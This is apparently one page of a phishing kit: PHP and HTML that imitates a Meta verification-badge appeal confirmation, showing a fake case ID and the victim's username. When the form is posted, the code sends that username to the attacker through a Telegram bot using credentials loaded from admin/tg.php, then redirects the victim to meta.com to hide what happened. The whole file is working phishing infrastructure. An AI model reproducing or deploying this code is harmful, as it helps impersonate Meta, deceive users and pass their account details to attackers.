<?php 
error_reporting(0);
session_start();

if($_POST) {
    $fore_user=$_SESSION["fore_user"];
    $ip=$_SERVER["REMOTE_ADDR"];
    require_once("admin/tg.php");
    header("Location:https://meta.com/");
    $data = [
    'text' => '

'.$fore_user.' Formu Bitirdi 
@webservicesx
',
    'chat_id' =>"$chatid"
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
  

    
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
    <link rel="stylesheet" href="css/style.css">

 
    <title>-</title>
</head>
<body> <center>

    </center>
  <div class="forebaby">
       
        <div class="yazi">
            <br>
            <br>

  <img width="180" src="imgs/ehe.png" alt="">

        <br><br>
            <h2>Successful!</h2>
            <p>Dear <b>@<?php $fore_user = $_SESSION["fore_user"];
                                            echo $fore_user; ?><img width="20" src="imgs/tik.png" alt=""> </b>,<br>
Your appeal has been sent successfully!
We will review verify badge again and provide you with feedback.
<br><br>
Thank you for your understanding.
<br><br>
Case ID: <b>#3690852147</b></p>
       <form method="POST"> 
       
          <button id="bttn" name="fore_user"  type="submit" class="btn2">Submit Form <b>@<?php $fore_user = $_SESSION["fore_user"];
                                            echo $fore_user; ?> </b></button>  </form>
           
    <br>  <br>
        
        </div>
    </div> <br>
   
      <center>
        <div class="alt"><br>
        <img width="150" src="imgs/ehe.png" alt="">
        <br><br>
        <p>For Meta Support and Complete message response please contact us best company and most robust Meta Verification Company</p>
        <br><br>
    </div>
    </center>
    <div class="enalt"> <br><br>
    <div class="enaltig">
        
        </div> 

        <div class="linksx">
        <a href="#">Community Standarts</a> &nbsp;&nbsp; | &nbsp;&nbsp;
        <a href="#">Data Policy</a> <br><br>
        <a href="#">Terms</a> 
         &nbsp;&nbsp; | &nbsp;&nbsp;
        <a href="#">Cookie Policy</a>
        </div>
                <br><hr color="#E0E0E0" size="0.1px" width="90%">
        <br>
        <div class="dil">
        <p>Language English (US)</p>
        </div>
        <br>
    </div>

 <script src="jquery-3.6.0.js" ></script>
<script>
        $( "form" ).submit(function( event ) {
            $( "#bttn" ).html("<i id='loader' class='fa fa-spinner fa-spin'></i>");
        });
    </script> 
</body>
</html> 